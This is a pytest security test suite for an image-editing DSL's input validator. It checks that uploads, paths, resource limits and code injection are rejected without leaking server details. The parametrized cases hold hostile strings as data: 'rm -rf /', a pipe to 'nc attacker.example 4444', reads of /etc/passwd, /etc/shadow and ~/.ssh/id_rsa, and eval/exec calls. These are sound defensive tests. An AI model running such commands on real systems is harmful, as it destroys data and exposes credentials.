"""
Security test suite. Run with:  pytest -v test_security.py

Covers the ten attack cases required by the specification. Each test asserts
both that the input is rejected and that the message returned to the user
leaks nothing about the server.
"""

import pytest

import security as sec
from security import Limits, SecurityError


PNG_HEADER = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
JPEG_HEADER = b"\xff\xd8\xff\xe0" + b"\x00" * 64


# --- 1. Unknown DSL command -------------------------------------------------

@pytest.mark.parametrize("command", ["DELETE", "SYSTEM", "load_file", "", "DROP TABLE"])
def test_unknown_command_rejected(command):
    with pytest.raises(SecurityError) as e:
        sec.validate_command(command)
    assert e.value.code == "UNKNOWN_COMMAND"


@pytest.mark.parametrize("command", ["LOAD", "save", " Blur ", "EDGE"])
def test_whitelisted_commands_accepted(command):
    assert sec.validate_command(command) in sec.ALLOWED_COMMANDS


# --- 2. Invalid file extension ---------------------------------------------

@pytest.mark.parametrize("name", ["payload.exe", "shell.php", "notes.txt", "image.png.sh"])
def test_invalid_extension_rejected(name):
    with pytest.raises(SecurityError) as e:
        sec.validate_upload(name, PNG_HEADER)
    assert e.value.code in {"INVALID_EXTENSION", "CONTENT_MISMATCH"}


def test_renamed_executable_caught_by_magic_bytes():
    with pytest.raises(SecurityError) as e:
        sec.validate_upload("innocent.png", b"MZ\x90\x00" + b"\x00" * 64)
    assert e.value.code == "CONTENT_MISMATCH"


def test_valid_png_accepted():
    stored = sec.validate_upload("cat.png", PNG_HEADER, "image/png")
    assert stored.endswith(".png") and "cat" not in stored  # name is regenerated


# --- 3. Oversized upload ----------------------------------------------------

def test_oversized_upload_rejected():
    oversized = PNG_HEADER + b"\x00" * (Limits.MAX_UPLOAD_BYTES + 1)
    with pytest.raises(SecurityError) as e:
        sec.validate_upload("big.png", oversized)
    assert e.value.code == "UPLOAD_TOO_LARGE"


# --- 4. Path traversal ------------------------------------------------------

@pytest.mark.parametrize("path", [
    "../../secret.txt",
    "../../../etc/passwd",
    r"C:\Windows\System32\config\SAM",
    "/etc/shadow",
    "..%2f..%2fsecret.png",
    "uploads/../../key.png",
    "\\\\server\\share\\x.png",
    "img.png\x00.txt",
])
def test_path_traversal_rejected(path):
    with pytest.raises(SecurityError) as e:
        sec.safe_basename(path)
    assert e.value.code in {"INVALID_PATH", "INVALID_EXTENSION"}


def test_resolve_inside_stays_in_sandbox(tmp_path):
    resolved = sec.resolve_inside(tmp_path, "photo.png")
    assert resolved.is_relative_to(tmp_path.resolve())

    with pytest.raises(SecurityError):
        sec.resolve_inside(tmp_path, "../escape.png")


# --- 5. Invalid resize dimensions ------------------------------------------

@pytest.mark.parametrize("w,h", [(0, 100), (-5, 100), (100, 0), (99999, 10), (10, 99999)])
def test_invalid_resize_rejected(w, h):
    with pytest.raises(SecurityError) as e:
        sec.validate_resize(w, h)
    assert e.value.code == "INVALID_RESIZE"


def test_valid_resize_accepted():
    assert sec.validate_resize("800", 600) == (800, 600)


# --- 6. Excessive blur radius ----------------------------------------------

@pytest.mark.parametrize("radius", [0, -3, Limits.MAX_BLUR_RADIUS + 1, 10_000])
def test_excessive_blur_rejected(radius):
    with pytest.raises(SecurityError) as e:
        sec.validate_blur(radius)
    assert e.value.code == "INVALID_BLUR"


# --- 7. Excessive number of operations -------------------------------------

def test_too_many_operations_rejected():
    with pytest.raises(SecurityError) as e:
        sec.validate_operation_count(Limits.MAX_OPERATIONS + 1)
    assert e.value.code == "TOO_MANY_OPERATIONS"


def test_too_many_lines_rejected():
    program = "\n".join(["GRAYSCALE"] * (Limits.MAX_DSL_LINES + 1))
    with pytest.raises(SecurityError) as e:
        sec.scan_source(program)
    assert e.value.code == "TOO_MANY_LINES"


# --- 8. Invalid parameter types --------------------------------------------

@pytest.mark.parametrize("value", ["abc", None, [1, 2], {"w": 1}, "10; rm -rf /"])
def test_invalid_parameter_types_rejected(value):
    with pytest.raises(SecurityError) as e:
        sec.validate_blur(value)
    assert e.value.code in {"INVALID_PARAMETER_TYPE", "INVALID_BLUR"}


@pytest.mark.parametrize("angle", [45, 17, 720, "ninety"])
def test_invalid_angle_rejected(angle):
    with pytest.raises(SecurityError):
        sec.validate_rotate(angle)


# --- 9. Malformed DSL -------------------------------------------------------

@pytest.mark.parametrize("program", ["", "   ", "\n\n\n"])
def test_empty_program_rejected(program):
    with pytest.raises(SecurityError) as e:
        sec.scan_source(program)
    assert e.value.code == "EMPTY_PROGRAM"


def test_oversized_program_rejected():
    with pytest.raises(SecurityError):
        sec.scan_source("A" * (Limits.MAX_DSL_CHARS + 1))


# --- 10. Arbitrary code injection ------------------------------------------

@pytest.mark.parametrize("program", [
    'LOAD "a.png"\nos.system("rm -rf /")',
    'exec("print(1)")',
    'eval("1+1")',
    '__import__("os").system("ls")',
    'LOAD "a.png"; cat /etc/passwd',
    'LOAD "a.png" | nc attacker.example 4444',
    'import subprocess',
    'LOAD "${HOME}/.ssh/id_rsa"',
    'GRAYSCALE `whoami`',
])
def test_code_injection_blocked(program):
    with pytest.raises(SecurityError) as e:
        sec.scan_source(program)
    assert e.value.code == "INJECTION_BLOCKED"


def test_clean_program_passes_scan():
    sec.scan_source(
        'LOAD "input.png"\n'
        '# resize then soften\n'
        'RESIZE 800 600\n'
        'BLUR 3\n'
        'SAVE "output.png"\n'
    )


# --- Error hygiene (requirement G) -----------------------------------------

def test_errors_do_not_leak_server_paths(tmp_path):
    with pytest.raises(SecurityError) as e:
        sec.resolve_inside(tmp_path, "../../etc/passwd")
    message = e.value.to_response()["message"]
    assert message == "Invalid file path."
    assert "/" not in message and str(tmp_path) not in message


def test_response_shape_has_no_internal_fields():
    err = SecurityError("Invalid file path.", code="INVALID_PATH",
                        detail="/srv/app/uploads/../../secret")
    body = err.to_response()
    assert set(body) <= {"error", "code", "message", "line"}
    assert "secret" not in str(body)


# --- Frontend checklist (requirement J) ------------------------------------

def test_checklist_all_pass_for_clean_input():
    report = sec.run_checklist('LOAD "a.png"\nGRAYSCALE\nSAVE "b.png"',
                               upload=("a.png", PNG_HEADER))
    assert report.ok
    assert [c["name"] for c in report.checks] == list(sec.CHECK_NAMES)


def test_checklist_reports_first_failure():
    report = sec.run_checklist('exec("boom")')
    assert not report.ok
    assert report.checks[0]["passed"] is False
    assert all(c["message"] == "Not reached." for c in report.checks[1:])


# --- Checklist gates are real, not decorative -------------------------------

@pytest.mark.parametrize("source, gate, code", [
    ('LOAD "a.png"\nos.system("rm -rf /")\nSAVE "b.png"', "Command validation", "INJECTION_BLOCKED"),
    ('LOAD "../../etc/passwd"\nSAVE "b.png"',            "Path validation",    "INVALID_PATH"),
    ('LOAD "a.png"\nSAVE "x.exe"',                       "Path validation",    "INVALID_EXTENSION"),
    ('LOAD "a.png"\nBLUR 999\nSAVE "b.png"',             "Resource limits",    "INVALID_BLUR"),
    ('LOAD "a.png"\nVIGNETTE 500\nSAVE "b.png"',         "Resource limits",    "INVALID_VIGNETTE"),
    ('LOAD "a.png"\nRESIZE 99999 10\nSAVE "b.png"',      "Resource limits",    "INVALID_RESIZE"),
    ('LOAD "a.png"\nDELETE 3\nSAVE "b.png"',             "Safe execution",     "UNKNOWN_COMMAND"),
])
def test_each_attack_is_stopped_by_the_right_gate(source, gate, code):
    report = sec.run_checklist(source)
    failing = [c for c in report.checks if not c["passed"] and c["message"] != "Not reached."]
    assert len(failing) == 1
    assert failing[0]["name"] == gate and failing[0]["code"] == code
    # everything after the failing gate is reported as not reached
    later = report.checks[[c["name"] for c in report.checks].index(gate) + 1:]
    assert all(c["message"] == "Not reached." for c in later)


def test_too_many_operations_is_a_resource_failure():
    source = 'LOAD "a.png"\n' + "GRAYSCALE\n" * Limits.MAX_OPERATIONS + 'SAVE "b.png"'
    failing = [c for c in sec.run_checklist(source).checks if not c["passed"]]
    assert failing[0]["name"] == "Resource limits"
    assert failing[0]["code"] == "TOO_MANY_OPERATIONS"


def test_failure_reports_the_offending_line():
    report = sec.run_checklist('LOAD "a.png"\nGRAYSCALE\nBLUR 500\nSAVE "b.png"')
    failing = next(c for c in report.checks if not c["passed"])
    assert failing["line"] == 3


def test_every_check_carries_a_plain_english_description():
    report = sec.run_checklist('LOAD "a.png"\nSAVE "b.png"')
    assert all(len(c["what"]) > 30 for c in report.checks)


def test_path_check_ignores_comments():
    sec.check_paths('LOAD "a.png"  # was "../../etc/passwd"\nSAVE "b.png"')


def test_checklist_never_rejects_what_the_compiler_accepts():
    """A red shield on a program that compiles would be a lie.

    Random programs, many of them nonsense: wherever the compiler accepts the
    program, every checklist gate must pass too.
    """
    import random

    from compiler.errors import CompilerError
    from compiler.pipeline import compile_program

    rng = random.Random(1234)
    names = ["a.png", "b.jpg", "x.webp", "../a.png", "a/b.png", "c.exe", ".h.png", "ok-1_2.png"]
    ops = [
        lambda: "GRAYSCALE",
        lambda: f"BLUR {rng.choice([-1, 0, 1, 7, 25, 26, 100])}",
        lambda: f"ROTATE {rng.choice([-360, -90, 0, 45, 90, 270, 360, 450])}",
        lambda: f"RESIZE {rng.choice([0, 1, 640, 4096, 4097])} {rng.choice([0, 1, 480, 4096])}",
        lambda: f"EDGE {rng.choice(['', '10 20', '300 200', '0 500', '0 501'])}".strip(),
        lambda: f"VIGNETTE {rng.choice([-5, 0, 1, 50, 100, 101])}",
        lambda: "blur   3  # trailing comment",
        lambda: "",
    ]
    accepted = 0
    for _ in range(600):
        body = "\n".join(rng.choice(ops)() for _ in range(rng.randint(0, 6)))
        source = f'LOAD "{rng.choice(names)}"\n{body}\nSAVE "{rng.choice(names)}"'
        try:
            compile_program(source, 1.0)
        except (CompilerError, SecurityError):
            continue
        accepted += 1
        report = sec.run_checklist(source)
        assert report.ok, f"checklist rejected a program the compiler accepts:\n{source}"
    assert accepted > 50          # the fuzz must actually exercise accepted programs
